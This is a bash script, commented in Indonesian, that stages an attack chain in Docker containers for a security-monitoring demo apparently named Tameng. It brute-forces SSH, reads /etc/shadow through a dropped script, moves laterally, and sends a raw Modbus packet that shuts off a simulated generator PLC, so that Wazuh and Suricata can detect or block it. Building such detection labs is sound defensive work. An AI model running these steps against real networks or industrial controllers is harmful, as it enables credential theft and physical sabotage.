#!/usr/bin/env bash
# Skenario serangan IT -> OT untuk demo Tameng.
#
#   attacker(10.10.5.90)  --SSH creds curian-->  pc-staf-07(10.10.5.66)
#     -> jalankan /tmp/exfil.sh (baca /etc/shadow)
#     -> dari sesi itu SSH lateral ke srv-file-01(10.10.5.7)
#     -> dari srv-file-01 kirim perintah Modbus mematikan genset di PLC(10.10.5.20)
#   Semua langkah setelah login berjalan di dalam sesi SSH penyerang.
#
# Semua trafik nyata: SSH sungguhan (terekam Wazuh) dan Modbus sungguhan
# (terdeteksi Suricata). Skrip ini hanya pemicunya. Bila Suricata berjalan dalam
# mode IPS (TAMENG_MODE=ips), perintah Modbus penyerang dijatuhkan dan genset
# tetap NYALA.
set -u
export PATH="$HOME/.docker/bin:$PATH"

P='\033[1;36m'; N='\033[0m'
step(){ echo -e "\n${P}==> $*${N}"; }

# Agen Wazuh yang baru start masih mendaftar ke manager; log sebelum terhubung
# tidak tercatat sebagai alert. Tunggu sampai tiap korban benar-benar terhubung.
for c in pc-staf-07 srv-file-01; do
  waited=0
  while :; do
    started=$(docker inspect -f '{{.State.StartedAt}}' "$c" 2>/dev/null) || { echo "container $c tidak jalan" >&2; exit 1; }
    t0=$(date -u -j -f '%Y-%m-%dT%H:%M:%S' "${started%%.*}" +%s 2>/dev/null || date -u -d "${started}" +%s)
    age=$(( $(date -u +%s) - t0 ))
    connected=$(docker exec "$c" grep -c "Connected to the server" /var/ossec/logs/ossec.log 2>/dev/null || true)
    [ "${connected:-0}" -ge 1 ] && break
    if [ "$waited" -ge 240 ]; then
      echo "Agen Wazuh di $c belum terhubung setelah 4 menit. Cek:" >&2
      echo "  docker exec $c tail /var/ossec/logs/ossec.log" >&2
      exit 1
    fi
    echo "  menunggu agen Wazuh di $c siap (terhubung=${connected:-0}, umur ${age} dtk)..."
    sleep 10; waited=$((waited + 10))
  done
done

step "0. Operator menyalakan genset lewat HMI resmi (hmi-genset 10.10.5.30) — operasi sah"
docker exec hmi-genset python3 /app/hmi.py on | sed 's/^/  [HMI] /'

step "1. Brute force SSH ke pc-staf-07 (beberapa percobaan gagal)"
for u in admin root operator; do
  docker exec attacker sshpass -p 123456 ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "$u@10.10.5.66" true >/dev/null 2>&1
  echo "  coba $u ... gagal"
done

step "2. Login BERHASIL dengan kredensial curian (sertu) + eksekusi payload dari /tmp"
docker exec attacker sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no \
  sertu@10.10.5.66 '
    printf "#!/bin/bash\ncat /etc/shadow > /tmp/creds.txt\n" > /tmp/exfil.sh
    chmod +x /tmp/exfil.sh
    /tmp/exfil.sh
    echo "  [pc-staf-07] /etc/shadow disalin ke /tmp/creds.txt"
  ' 2>&1 | tail -1

step "3. Gerak lateral: lewat sesi penyerang di pc-staf-07, SSH ke srv-file-01, lalu kirim Modbus MATIKAN genset (coil0=0)"
# Satu rantai sesi nyata: attacker -> pc-staf-07 -> srv-file-01 -> PLC.
# Skrip Python dikirim lewat stdin melalui kedua sesi SSH (python3 -), sehingga
# perintah Modbus benar-benar keluar dari srv-file-01 SETELAH login lateral.
docker exec -i attacker sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no \
  sertu@10.10.5.66 \
  "sshpass -p Mawar2024 ssh -o StrictHostKeyChecking=no sertu@10.10.5.7 python3 -" <<'PY'
import socket, time
print("  [srv-file-01] berhasil diakses dari pc-staf-07")
time.sleep(2)   # jeda realistis antara login dan aksi
# fc5 addr0 val 0x0000 = OFF
s=socket.create_connection(("10.10.5.20",502),timeout=5)
s.sendall(bytes.fromhex("000100000006010500000000"))
try:
    s.recv(64)
    print("  perintah Modbus OFF terkirim ke PLC genset dari srv-file-01")
except socket.timeout:
    print("  perintah Modbus OFF tidak dijawab PLC (diblokir di jalan)")
s.close()
PY

step "4. Status genset menurut HMI resmi"
STATE=$(docker exec hmi-genset python3 /app/hmi.py status)
if [ "$STATE" = "GENSET NYALA" ]; then
  echo -e "  \033[1;32m$STATE — serangan ke OT digagalkan\033[0m"
else
  echo -e "  \033[1;31m$STATE — dampak serangan ke OT\033[0m"
fi

echo -e "\n${P}Selesai. Periksa linimasa bukti dengan: scripts/timeline.py${N}"
